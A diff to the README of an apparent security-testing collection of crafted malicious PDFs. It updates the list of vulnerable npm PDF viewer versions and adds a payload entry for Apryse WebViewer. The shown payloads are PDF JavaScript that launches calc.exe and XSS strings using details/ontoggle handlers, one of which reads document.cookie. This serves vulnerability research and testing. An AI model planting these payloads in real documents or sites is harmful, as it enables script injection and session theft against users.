@@ -7,7 +7,7 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 ### Vulnerabilities found
 
 - [Foxit PDF SDK For Web](https://www.npmjs.com/package/@foxitsoftware/foxit-pdf-sdk-for-web-library) 7.5.0 (~600 weekly downloads)
-- [PDFTron WebViewer](https://www.npmjs.com/package/@pdftron/webviewer) 7.2.0, 7.3.1, 8.6.1, 10.1.0 (~75k weekly downloads)
+- [PDFTron WebViewer](https://www.npmjs.com/package/@pdftron/webviewer) 7.2.0, 7.3.1, 8.6.1, 10.1.0, 10.7.2 (~87k weekly downloads)
 - [PSPDFKit for Web](https://www.npmjs.com/package/pspdfkit) 2021.4.1 (~13k weekly downloads)
 - [Syncfusion ej2-pdfviewer](https://www.npmjs.com/package/@syncfusion/ej2-pdfviewer) 20.2.40 (~6.8k weekly downloads)
 - [React PDF viewer](https://www.npmjs.com/package/@react-pdf-viewer/core) 3.6.0 (~34k weekly downloads)
@@ -80,6 +80,14 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 ```
  /JS (app.alert\(1\); app.launchURL\("/C/Windows/system32/calc.exe", true\); app.launchURL\("'><details open ontoggle=confirm\(3\);", true\);)
 ```
+
+### payload7.pdf
+
+**Line 50**. Try to run arbitrary Javascript injected via annotation. It works on vulnerable Apryse PDF Webviewer versions.
+```
+/V (">'></div><details/open/ontoggle=confirm(document.cookie)></details>)
+```
+
 
 ___
 
